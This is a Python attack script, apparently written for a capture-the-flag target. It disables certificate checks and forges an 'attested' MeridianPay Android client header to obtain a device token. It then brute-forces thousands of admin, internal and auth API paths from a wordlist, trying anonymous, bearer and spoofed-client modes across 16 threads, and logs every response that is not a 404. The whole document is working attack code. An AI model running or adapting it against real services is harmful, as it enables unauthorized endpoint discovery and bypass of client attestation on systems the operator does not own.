import json, ssl, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor
BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
CL = "MeridianPay-Android/3.2.1 (attested)"

def raw(p, mode="both", m="GET", b=None, t=None):
    hh = {"Content-Type": "application/json"}
    if mode in ("attested", "both"): hh["X-Meridian-Client"] = CL
    if mode in ("bearer", "both") and t: hh["Authorization"] = "Bearer " + t
    d = json.dumps(b).encode() if b is not None else None
    r = urllib.request.Request(BASE+p, data=d, method=m, headers=hh)
    try:
        with urllib.request.urlopen(r, context=CTX, timeout=12) as f: return f.status, f.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

for _ in range(4):
    c, t = raw("/api/v1/auth/device", "attested", "POST", {"device_id": "modes"})
    try:
        T = json.loads(t)["token"]; break
    except Exception:
        continue
print("token ok", flush=True)

NOUN = open("nouns.txt").read().split()
TAIL = ["", "/me", "/flag", "/export", "/1001", "/1", "/current", "/all"]
paths = set()
for pre in ["/", "/api/", "/api/v1/", "/api/v1/internal/", "/api/v1/admin/", "/api/v1/auth/",
            "/api/v1/accounts/", "/api/v1/promo/", "/v1/", "/internal/", "/admin/", "/mobile/"]:
    for n in NOUN:
        paths.add(pre + n)
        if pre in ("/api/v1/", "/api/v1/admin/", "/api/v1/internal/", "/api/v1/accounts/"):
            for tl in TAIL[1:5]:
                paths.add(pre + n + tl)
paths = sorted(paths)
MODES = ["anon", "bearer", "attested"]
print("paths", len(paths), flush=True)

def work(p):
    outs = []
    for mode in MODES:
        c, b = raw(p, mode, t=T)
        if not (c == 404 and "404 Not Found" in b):
            outs.append((mode, c, b[:180]))
    return (p, outs) if outs else None

with ThreadPoolExecutor(max_workers=16) as ex:
    for i, r in enumerate(ex.map(work, paths)):
        if r: print("HIT", r[0], r[1], flush=True)
        if i % 3000 == 0: print("...", i, flush=True)
print("DONE-MODES")
